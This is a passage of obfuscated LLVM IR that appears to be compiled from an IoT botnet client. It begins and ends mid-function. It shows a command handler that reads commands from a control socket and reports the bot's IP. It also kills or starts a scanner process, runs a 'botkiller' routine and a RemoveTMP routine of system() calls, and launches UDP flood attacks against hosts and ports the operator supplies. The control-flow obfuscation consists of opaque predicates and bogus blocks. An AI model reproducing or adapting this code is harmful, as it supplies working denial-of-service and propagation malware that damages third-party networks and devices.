  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %130
  %132 = load i8*, i8** %131, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %124, i64 127, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.456, i32 0, i32 0), i8* %128, i8* %132, i8* %136) #5
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %86
  %138 = load i32, i32* %9, align 4
  %_ = shl i32 %138, 1
  %_2 = sub i32 %138, 1
  %gen = mul i32 %_2, 1
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %105
  %140 = call i32 @sleep(i32 5)
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #2

declare i32 @system(i8*) #4

declare i32 @sleep(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @RemoveTMP() #0 {
  %1 = load i32, i32* @x.105
  %2 = load i32, i32* @y.106
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.458, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.460, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.461, i32 0, i32 0))
  %14 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.462, i32 0, i32 0))
  %15 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.463, i32 0, i32 0))
  %16 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.464, i32 0, i32 0))
  %17 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.465, i32 0, i32 0))
  %18 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.466, i32 0, i32 0))
  %19 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.467, i32 0, i32 0))
  %20 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.468, i32 0, i32 0))
  %21 = call i32 @system(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.469, i32 0, i32 0))
  %22 = load i32, i32* @x.105
  %23 = load i32, i32* @y.106
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %30 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.458, i32 0, i32 0))
  %31 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i32 0, i32 0))
  %32 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.460, i32 0, i32 0))
  %33 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i32 0, i32 0))
  %34 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.461, i32 0, i32 0))
  %35 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.462, i32 0, i32 0))
  %36 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.463, i32 0, i32 0))
  %37 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.464, i32 0, i32 0))
  %38 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.465, i32 0, i32 0))
  %39 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.466, i32 0, i32 0))
  %40 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.467, i32 0, i32 0))
  %41 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.468, i32 0, i32 0))
  %42 = call i32 @system(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.469, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #10
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %39, label %36

; <label>:36:                                     ; preds = %2
  %37 = load i32, i32* @mainCommSock, align 4
  %38 = call i32 (i32, i8*, ...) @sockprintf(i32 %37, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.470, i32 0, i32 0))
  br label %1297

; <label>:39:                                     ; preds = %2
  %40 = load i8**, i8*** %4, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @strcmp(i8* %42, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i32 0, i32 0)) #10
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %50, label %45

; <label>:45:                                     ; preds = %39
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %48 = call i8* @inet_ntoa(i32 %47) #5
  %49 = call i32 (i32, i8*, ...) @sockprintf(i32 %46, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.472, i32 0, i32 0), i8* %48)
  br label %1297

; <label>:50:                                     ; preds = %39
  %51 = load i8**, i8*** %4, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 0
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strcmp(i8* %53, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.473, i32 0, i32 0)) #10
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %81, label %56

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* @x.107
  %58 = load i32, i32* @y.108
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %56
  %65 = call i32 @listFork()
  %66 = icmp ne i32 %65, 0
  %67 = load i32, i32* @x.107
  %68 = load i32, i32* @y.108
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %66, label %80, label %75

; <label>:75:                                     ; preds = %originalBBpart2
  %76 = load i32, i32* @mainCommSock, align 4
  %77 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %78 = call i8* @inet_ntoa(i32 %77) #5
  %79 = call i32 (i32, i8*, ...) @sockprintf(i32 %76, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.474, i32 0, i32 0), i8* %78)
  call void @botkiller()
  call void @RemoveTMP()
  call void @_exit(i32 0) #12
  unreachable

; <label>:80:                                     ; preds = %originalBBpart2
  br label %81

; <label>:81:                                     ; preds = %80, %50
  %82 = load i32, i32* @x.107
  %83 = load i32, i32* @y.108
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %81
  %90 = load i8**, i8*** %4, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 0
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @strcmp(i8* %92, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.475, i32 0, i32 0)) #10
  %94 = icmp ne i32 %93, 0
  %95 = load i32, i32* @x.107
  %96 = load i32, i32* @y.108
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %94, label %253, label %103

; <label>:103:                                    ; preds = %originalBBpart24
  %104 = load i8**, i8*** %4, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 1
  %106 = load i8*, i8** %105, align 8
  %107 = call i32 @strcmp(i8* %106, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i32 0, i32 0)) #10
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %116, label %109

; <label>:109:                                    ; preds = %103
  %110 = load i32, i32* @scanPid, align 4
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %109
  br label %1297

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* @scanPid, align 4
  %115 = call i32 @kill(i32 %114, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %116

; <label>:116:                                    ; preds = %113, %103
  %117 = load i32, i32* @x.107
  %118 = load i32, i32* @y.108
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %116
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 1
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @strcmp(i8* %127, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i32 0, i32 0)) #10
  %129 = icmp ne i32 %128, 0
  %130 = load i32, i32* @x.107
  %131 = load i32, i32* @y.108
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %129, label %236, label %138

; <label>:138:                                    ; preds = %originalBBpart28
  %139 = load i32, i32* @scanPid, align 4
  %140 = icmp ne i32 %139, 0
  br i1 %140, label %141, label %158

; <label>:141:                                    ; preds = %138
  %142 = load i32, i32* @x.107
  %143 = load i32, i32* @y.108
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %141
  %150 = load i32, i32* @x.107
  %151 = load i32, i32* @y.108
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %1297

; <label>:158:                                    ; preds = %138
  %159 = load i32, i32* @x.107
  %160 = load i32, i32* @y.108
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %158
  %167 = call i32 @fork() #5
  store i32 %167, i32* %6, align 4
  store i32 400, i32* %7, align 4
  store i32 7, i32* %8, align 4
  %168 = load i32, i32* %6, align 4
  %169 = icmp ugt i32 %168, 0
  %170 = load i32, i32* @x.107
  %171 = load i32, i32* @y.108
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %169, label %178, label %180

; <label>:178:                                    ; preds = %originalBBpart216
  %179 = load i32, i32* %6, align 4
  store i32 %179, i32* @scanPid, align 4
  br label %1297

; <label>:180:                                    ; preds = %originalBBpart216
  %181 = load i32, i32* @x.107
  %182 = load i32, i32* @y.108
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %180
  %189 = load i32, i32* %6, align 4
  %190 = icmp eq i32 %189, -1
  %191 = load i32, i32* @x.107
  %192 = load i32, i32* @y.108
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %190, label %199, label %216

; <label>:199:                                    ; preds = %originalBBpart220
  %200 = load i32, i32* @x.107
  %201 = load i32, i32* @y.108
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %199
  %208 = load i32, i32* @x.107
  %209 = load i32, i32* @y.108
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %1297

; <label>:216:                                    ; preds = %originalBBpart220
  br label %217

; <label>:217:                                    ; preds = %216
  %218 = load i32, i32* @x.107
  %219 = load i32, i32* @y.108
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %217
  %226 = load i32, i32* %8, align 4
  %227 = load i32, i32* %7, align 4
  call void (i32, i32, ...) bitcast (void ()* @StartTheLelz to void (i32, i32, ...)*)(i32 %226, i32 %227)
  call void @_exit(i32 0) #12
  %228 = load i32, i32* @x.107
  %229 = load i32, i32* @y.108
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  unreachable

; <label>:236:                                    ; preds = %originalBBpart28
  %237 = load i32, i32* @x.107
  %238 = load i32, i32* @y.108
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %236
  %245 = load i32, i32* @x.107
  %246 = load i32, i32* @y.108
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %253

; <label>:253:                                    ; preds = %originalBBpart232, %originalBBpart24
  %254 = load i32, i32* @x.107
  %255 = load i32, i32* @y.108
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %253
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 0
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @strcmp(i8* %264, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.478, i32 0, i32 0)) #10
  %266 = icmp ne i32 %265, 0
  %267 = load i32, i32* @x.107
  %268 = load i32, i32* @y.108
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %266, label %484, label %275

; <label>:275:                                    ; preds = %originalBBpart236
  %276 = load i32, i32* %3, align 4
  %277 = icmp slt i32 %276, 6
  br i1 %277, label %339, label %278

; <label>:278:                                    ; preds = %275
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds i8*, i8** %279, i64 3
  %281 = load i8*, i8** %280, align 8
  %282 = call i32 @atoi(i8* %281) #10
  %283 = icmp eq i32 %282, -1
  br i1 %283, label %339, label %284

; <label>:284:                                    ; preds = %278
  %285 = load i32, i32* @x.107
  %286 = load i32, i32* @y.108
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %284
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 2
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #10
  %297 = icmp eq i32 %296, -1
  %298 = load i32, i32* @x.107
  %299 = load i32, i32* @y.108
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %297, label %339, label %306

; <label>:306:                                    ; preds = %originalBBpart240
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 4
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #10
  %311 = icmp eq i32 %310, -1
  br i1 %311, label %339, label %312

; <label>:312:                                    ; preds = %306
  %313 = load i8**, i8*** %4, align 8
  %314 = getelementptr inbounds i8*, i8** %313, i64 5
  %315 = load i8*, i8** %314, align 8
  %316 = call i32 @atoi(i8* %315) #10
  %317 = icmp eq i32 %316, -1
  br i1 %317, label %339, label %318

; <label>:318:                                    ; preds = %312
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 5
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #10
  %323 = icmp sgt i32 %322, 65500
  br i1 %323, label %339, label %324

; <label>:324:                                    ; preds = %318
  %325 = load i8**, i8*** %4, align 8
  %326 = getelementptr inbounds i8*, i8** %325, i64 4
  %327 = load i8*, i8** %326, align 8
  %328 = call i32 @atoi(i8* %327) #10
  %329 = icmp sgt i32 %328, 32
  br i1 %329, label %339, label %330

; <label>:330:                                    ; preds = %324
  %331 = load i32, i32* %3, align 4
  %332 = icmp eq i32 %331, 7
  br i1 %332, label %333, label %340

; <label>:333:                                    ; preds = %330
  %334 = load i8**, i8*** %4, align 8
  %335 = getelementptr inbounds i8*, i8** %334, i64 6
  %336 = load i8*, i8** %335, align 8
  %337 = call i32 @atoi(i8* %336) #10
  %338 = icmp slt i32 %337, 1
  br i1 %338, label %339, label %340

; <label>:339:                                    ; preds = %333, %324, %318, %312, %306, %originalBBpart240, %278, %275
  br label %1297

; <label>:340:                                    ; preds = %333, %330
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 1
  %343 = load i8*, i8** %342, align 8
  store i8* %343, i8** %9, align 8
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 2
  %346 = load i8*, i8** %345, align 8
  %347 = call i32 @atoi(i8* %346) #10
  store i32 %347, i32* %10, align 4
  %348 = load i8**, i8*** %4, align 8
  %349 = getelementptr inbounds i8*, i8** %348, i64 3
  %350 = load i8*, i8** %349, align 8
  %351 = call i32 @atoi(i8* %350) #10
  store i32 %351, i32* %11, align 4
  %352 = load i8**, i8*** %4, align 8
  %353 = getelementptr inbounds i8*, i8** %352, i64 4
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 @atoi(i8* %354) #10
  store i32 %355, i32* %12, align 4
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 5
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @atoi(i8* %358) #10
  store i32 %359, i32* %13, align 4
  %360 = load i32, i32* %3, align 4
  %361 = icmp eq i32 %360, 7
  br i1 %361, label %362, label %367

; <label>:362:                                    ; preds = %340
  %363 = load i8**, i8*** %4, align 8
  %364 = getelementptr inbounds i8*, i8** %363, i64 6
  %365 = load i8*, i8** %364, align 8
  %366 = call i32 @atoi(i8* %365) #10
  br label %368

; <label>:367:                                    ; preds = %340
  br label %368

; <label>:368:                                    ; preds = %367, %362
  %369 = phi i32 [ %366, %362 ], [ 10, %367 ]
  store i32 %369, i32* %14, align 4
  %370 = load i8*, i8** %9, align 8
  %371 = call i8* @strstr(i8* %370, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %372 = icmp ne i8* %371, null
  br i1 %372, label %373, label %424

; <label>:373:                                    ; preds = %368
  %374 = load i8*, i8** %9, align 8
  %375 = call i8* @strtok(i8* %374, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %375, i8** %15, align 8
  br label %376

; <label>:376:                                    ; preds = %originalBBpart248, %373
  %377 = load i8*, i8** %15, align 8
  %378 = icmp ne i8* %377, null
  br i1 %378, label %379, label %423

; <label>:379:                                    ; preds = %376
  %380 = load i32, i32* @x.107
  %381 = load i32, i32* @y.108
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %379
  %388 = call i32 @listFork()
  %389 = icmp ne i32 %388, 0
  %390 = load i32, i32* @x.107
  %391 = load i32, i32* @y.108
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %389, label %405, label %398

; <label>:398:                                    ; preds = %originalBBpart244
  %399 = load i8*, i8** %15, align 8
  %400 = load i32, i32* %10, align 4
  %401 = load i32, i32* %11, align 4
  %402 = load i32, i32* %12, align 4
  %403 = load i32, i32* %13, align 4
  %404 = load i32, i32* %14, align 4
  call void @sendUDP(i8* %399, i32 %400, i32 %401, i32 %402, i32 %403, i32 %404)
  call void @_exit(i32 0) #12
  unreachable

; <label>:405:                                    ; preds = %originalBBpart244
  %406 = load i32, i32* @x.107
  %407 = load i32, i32* @y.108
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %405
  %414 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %414, i8** %15, align 8
  %415 = load i32, i32* @x.107
  %416 = load i32, i32* @y.108
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %376

; <label>:423:                                    ; preds = %376
  br label %467

; <label>:424:                                    ; preds = %368
  %425 = load i32, i32* @x.107
  %426 = load i32, i32* @y.108
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %424
  %433 = call i32 @listFork()
  %434 = icmp ne i32 %433, 0
  %435 = load i32, i32* @x.107
  %436 = load i32, i32* @y.108
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %434, label %443, label %444

; <label>:443:                                    ; preds = %originalBBpart252
  br label %1297

; <label>:444:                                    ; preds = %originalBBpart252
  %445 = load i32, i32* @x.107
  %446 = load i32, i32* @y.108
  %447 = sub i32 %445, 1
  %448 = mul i32 %445, %447
  %449 = urem i32 %448, 2
  %450 = icmp eq i32 %449, 0
  %451 = icmp slt i32 %446, 10
  %452 = or i1 %450, %451
  br i1 %452, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %444
  %453 = load i8*, i8** %9, align 8
  %454 = load i32, i32* %10, align 4
  %455 = load i32, i32* %11, align 4
  %456 = load i32, i32* %12, align 4
  %457 = load i32, i32* %13, align 4
  %458 = load i32, i32* %14, align 4
  call void @sendUDP(i8* %453, i32 %454, i32 %455, i32 %456, i32 %457, i32 %458)
  call void @_exit(i32 0) #12
  %459 = load i32, i32* @x.107
  %460 = load i32, i32* @y.108
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  unreachable

; <label>:467:                                    ; preds = %423
  %468 = load i32, i32* @x.107
  %469 = load i32, i32* @y.108
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %467
  %476 = load i32, i32* @x.107
  %477 = load i32, i32* @y.108
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
